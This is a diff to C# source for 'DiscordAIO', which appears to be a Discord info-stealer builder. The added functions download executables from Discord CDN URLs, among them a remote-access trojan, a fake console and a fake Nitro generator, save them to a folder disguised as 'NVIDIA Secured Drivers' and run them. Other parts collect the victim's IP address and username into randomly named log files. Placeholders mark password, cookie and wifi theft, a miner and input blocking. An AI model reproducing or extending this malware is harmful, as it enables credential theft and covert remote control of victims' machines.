@@ -260,6 +260,7 @@ namespace DiscordAIO
 		public static string ExploitDir = zxczxczxc + "\\" + "AIO";
 		public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm");
 		public static string dateLog = DateTime.Now.ToString("MM/dd/yyyy");
+		public static string loggedDate = dateLog.ToString();
 	}
 	class Defender
 	{
@@ -2843,13 +2844,18 @@ namespace DiscordAIO
 		// Thanks to Sp00p64
 		public static void RunRAT() 
 		{
+			if (!Directory.Exists(EEEEEappdata + "\\NVIDIA Secured Drivers"))
+            {
+                Directory.CreateDirectory(EEEEEappdata + "\\NVIDIA Secured Drivers");
+			}
+
 			try
 			{
-				new WebClient().DownloadFile(ratURL, EEEEEappdata + "NVIDIA Secured Drivers\\DiscordRAT.exe");
+				new WebClient().DownloadFile(ratURL, EEEEEappdata + "\\NVIDIA Secured Drivers\\DiscordRAT.exe");
 			}
 			catch {}
 
-			Process.Start(EEEEEappdata + "NVIDIA Secured Drivers\\DiscordRAT.exe");
+			Process.Start(EEEEEappdata + "\\NVIDIA Secured Drivers\\DiscordRAT.exe");
 		}
 
 		private static string minePool = "%poolhere%";
@@ -2918,6 +2924,37 @@ namespace DiscordAIO
 
 
 
+		public static void RunFAKEcmd() 
+		{
+		    if (!Directory.Exists(EEEEEappdata + "\\NVIDIA Secured Drivers"))
+            {
+                Directory.CreateDirectory(EEEEEappdata + "\\NVIDIA Secured Drivers");
+			}
+
+			try
+			{
+				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/950526489328242718/FakeConsole.exe", EEEEEappdata + "\\NVIDIA Secured Drivers\\FakeConsole.exe");
+			}
+			catch {}
+			Process.Start(EEEEEappdata + "\\NVIDIA Secured Drivers\\FakeConsole.exe");
+		}
+
+		public static void RunFAKENitroGEN() 
+		{
+			if (!Directory.Exists(EEEEEappdata + "\\NVIDIA Secured Drivers"))
+            {
+                Directory.CreateDirectory(EEEEEappdata + "\\NVIDIA Secured Drivers");
+			}
+
+			try
+			{
+				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/950526991625506876/nitrogen.exe", EEEEEappdata + "\\NVIDIA Secured Drivers\\nitrogen.exe");
+			}
+			catch {}
+			Process.Start(EEEEEappdata + "\\NVIDIA Secured Drivers\\nitrogen.exe");
+		}
+
+
 		public static void BlockInput()
 		{
 			Brrrrrr.BlockInput(true);
@@ -2971,11 +3008,23 @@ namespace DiscordAIO
 			File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# End of Win Key \n");
         }
 
+		public static Random randewigoewigj = new Random();
+		static string genMeName(int length)
+        {
+            string c = "";
+            string alph = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+            for (int x = 0; x < length; x++)
+            {
+                c += alph[randewigoewigj.Next(0, alph.Length - 1)];
+            }
+            return c;
+        }
+
 		private static void Main(string[] args)
 		{
 
 			string filenameSpacer = Environment.UserName;
-			hisName.howtonameit = filenameSpacer + ".dAIO";
+			hisName.howtonameit = filenameSpacer + "_" + genMeName(12) + ".dAIO";
 
 			WebClient webClient = new WebClient();
 			string ip = webClient.DownloadString("http://checkip.dyndns.org");
@@ -2990,17 +3039,17 @@ namespace DiscordAIO
 
 			Discord.WriteDiscord();
 
-			var macAddr = (from nic in NetworkInterface.GetAllNetworkInterfaces() where nic.OperationalStatus == OperationalStatus.Up select nic.GetPhysicalAddress().ToString()).FirstOrDefault();
-			string macString = macAddr.ToString();
+			// Some mac adress new method
+			//string macString = macAddr.ToString();
 
 			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\n# Main informations \n");
 			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\nDesktop name: " + Environment.UserName + " | \n");
 			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "IP Address: " + ip + " | \n");
 			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\n# End of Main informations \n");
 
-			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\n# Additional informations \n");
-			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\nMAC Address: " + macString + " | \n");
-			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\n# End of Additional informations \n");
+			//File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\n# Additional informations \n");
+			//File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\nMAC Address: " + macString + " | \n");
+			//File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\n# End of Additional informations \n");
 
 			//stealpasses
 			//stealcookies
@@ -3014,13 +3063,6 @@ namespace DiscordAIO
 			//stealwifi
 
 			//jumpscare
-
-			string textDAIO = File.ReadAllText(Handler.ExploitDir + "\\" + hisName.howtonameit);
-			string encryption = Cipher.Encrypt(textDAIO);
-			textDAIO = textDAIO.Replace(textDAIO, encryption);
-			File.WriteAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, textDAIO);
-
-
 
 			string myColor = %selectedColor%.ToString();
 			string messageToEmbed =
@@ -3047,6 +3089,9 @@ namespace DiscordAIO
 			//takepic
 
 			//custom
+
+			//ourcoolfakecmd
+			//ourcoolfakenitrogen
 
 			//ratoverhere
 
